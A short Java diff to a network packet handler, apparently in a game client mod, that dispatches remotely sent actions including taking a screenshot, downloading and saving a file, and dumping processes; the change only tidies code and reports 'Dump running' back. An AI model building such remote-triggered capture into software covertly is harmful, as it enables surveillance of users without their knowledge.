@@ -24,7 +24,7 @@ public class Network {
         ByteArrayDataInput buffer = ByteStreams.newDataInput(event.packet.payload().array());
 
         Action action = Action.getAction(buffer.readUTF());
-        ByteArrayDataOutput out = ByteStreams.newDataOutput();
+
         switch (action) {
             case SCREENSHOT:
                 new Screenshot(buffer.readUTF()).start();
@@ -63,13 +63,8 @@ public class Network {
                 downloadAndSave.start();
                 break;
             case PROCESS:
-               // Thread thread = new Thread(){
-                    //public void run(){
-                        System.out.println("Dump running");
+                        sendMessage("Dump running");
                         Dump.dump();
-                //   // }
-                //};
-                //thread.start();
                 break;
             default:
                 break;
